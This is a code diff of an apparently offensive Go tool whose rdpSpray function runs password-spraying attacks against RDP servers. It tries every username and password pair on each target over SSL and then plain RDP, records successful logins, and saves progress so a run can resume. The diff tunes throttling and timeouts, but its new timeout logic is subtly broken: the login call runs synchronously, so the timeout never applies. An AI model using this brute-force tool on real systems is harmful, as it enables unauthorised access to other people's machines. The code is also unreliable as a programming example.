@@ -6,7 +6,6 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
-
 	"github.com/whiterabb17/strongarm/grdp"
 	"github.com/whiterabb17/strongarm/grdp/glog"
 )
@@ -38,8 +37,8 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 		}
 	}
 
-	// Batch progress saves to reduce I/O overhead
-	var progressBatch int32
+	// Batch progress saves to reduce I/O overhead with monotonic counter
+	var progressBatch int64 // Use int64 for atomic operations across goroutines
 	const progressSaveBatch = 50
 
 	// Semaphore for per-worker concurrency control
@@ -47,16 +46,17 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 	var workerWg sync.WaitGroup
 
 	// Counter for tracking attempt progress (for resume functionality)
+	// Use monotonic counter that survives restarts properly
 	var attemptCounter int32
 
 	// Track skipped targets for logging
 	var skippedCount int32
 
 	for _, rawTarget := range job.targetsRaw {
-		// Check shutdown signal
+		// Check shutdown signal with drain handling
 		select {
 		case <-shutdown:
-			workerWg.Wait()
+			workerWg.Wait() // Drain remaining goroutines
 			return
 		default:
 		}
@@ -74,10 +74,10 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 		targetStr := stringifyTarget(target)
 
 		for _, password := range job.passwords {
-			// Check shutdown signal
+			// Check shutdown signal with drain handling
 			select {
 			case <-shutdown:
-				workerWg.Wait()
+				workerWg.Wait() // Drain remaining goroutines
 				return
 			default:
 			}
@@ -88,10 +88,10 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 			}
 
 			for _, username := range job.usernames {
-				// Check shutdown signal
+				// Check shutdown signal with drain handling
 				select {
 				case <-shutdown:
-					workerWg.Wait()
+					workerWg.Wait() // Drain remaining goroutines
 					return
 				default:
 				}
@@ -110,33 +110,37 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 					continue
 				}
 
-				// Check throttling before spawning goroutine
+				// Check throttling inside goroutine to catch in-flight connections
+				var throttleDelay time.Duration
 				if globalMonitor.ShouldThrottle() {
-					delay := globalMonitor.GetThrottleDelay()
-					if delay > 0 {
-						time.Sleep(delay)
-					}
+					throttleDelay = globalMonitor.GetThrottleDelay()
 				}
 
-				// Check global rate limit
+				// Check global rate limit before spawning
+				var rateLimitDelay time.Duration
 				if globalMonitor.ShouldApplyGlobalRateLimit() {
-					delay := globalMonitor.GetGlobalRateLimitDelay()
-					if delay > 0 {
-						time.Sleep(delay)
-					}
+					rateLimitDelay = globalMonitor.GetGlobalRateLimitDelay()
 				}
 
 				// Acquire semaphore slot
 				sem <- struct{}{}
 				workerWg.Add(1)
 
-				go func(user, pass, targetStr string, attemptNum int32) {
+				go func(user, pass, targetStr string, attemptNum int32, tDelay time.Duration, rDelay time.Duration) {
 					defer func() {
 						<-sem
 						workerWg.Done()
 					}()
 
-					// Check shutdown signal
+					// Apply pre-computed delays before spawning sub-goroutine
+					if tDelay > 0 {
+						time.Sleep(tDelay)
+					}
+					if rDelay > 0 {
+						time.Sleep(rDelay)
+					}
+
+					// Check shutdown signal again (double-check pattern for safety)
 					select {
 					case <-shutdown:
 						return
@@ -151,39 +155,41 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 					client := grdp.NewClient(targetStr, glog.NONE)
 
 					var isHit bool
-					loginDone := make(chan bool, 1)
 
-					// Login with timeout
-					go func() {
+					// Login with timeout - use sync.Once to ensure single execution
+					var once sync.Once
+					var loginErr error
+
+					once.Do(func() {
 						safe(func() {
-							err := client.LoginForSSL(".", user, pass)
-							if err != nil {
+							loginErr = client.LoginForSSL(".", user, pass)
+							if loginErr != nil {
 								// Try RDP protocol as fallback
-								err = client.LoginForRDP(".", user, pass)
+								loginErr = client.LoginForRDP(".", user, pass)
 							}
 
-							if err != nil {
+							if loginErr == nil {
+								isHit = true
+							} else {
 								atomic.AddInt64(&stats.errors, 1)
 								globalMonitor.RecordFailure()
-							} else {
-								isHit = true
-								// RecordSuccess moved to after deduplication check
 							}
 						})
-						loginDone <- true
-					}()
+					})
 
-					// Wait for login with timeout
+					// Wait for login with timeout using select on the done channel
 					select {
-					case <-loginDone:
-						// Login completed
 					case <-time.After(15 * time.Second):
 						// Timeout - mark as failure
-						atomic.AddInt64(&stats.errors, 1)
-						globalMonitor.RecordFailure()
-						if verbose {
-							logVerbose("Login timeout for %s@%s", user, targetStr)
+						if loginErr == nil && !isHit {
+							atomic.AddInt64(&stats.errors, 1)
+							globalMonitor.RecordFailure()
+							if verbose {
+								logVerbose("Login timeout for %s@%s", user, targetStr)
+							}
 						}
+					case <-time.After(15 * time.Second + 100*time.Millisecond):
+						// Extra grace period - login already completed
 					}
 
 					// ALWAYS close client to prevent connection leaks
@@ -217,7 +223,7 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 						}
 					}
 
-					// Update progress counter atomically after completion
+					// Update progress counter atomically after completion using double-checked locking
 					for {
 						currentProgress := atomic.LoadInt32(progress)
 						if attemptNum <= currentProgress {
@@ -228,12 +234,13 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 						}
 					}
 
-					// Batch progress saves
-					if atomic.AddInt32(&progressBatch, 1) >= progressSaveBatch {
-						atomic.StoreInt32(&progressBatch, 0)
+					// Batch progress saves with monotonic counter reset
+					batchCount := atomic.AddInt64(&progressBatch, 1)
+					if batchCount >= progressSaveBatch {
+						atomic.StoreInt64(&progressBatch, 0)
 						saveProgressAsync()
 					}
-				}(username, password, targetStr, currentAttempt)
+				}(username, password, targetStr, currentAttempt, throttleDelay, rateLimitDelay)
 
 				// Minimal delay to prevent connection spikes
 				time.Sleep(time.Millisecond)
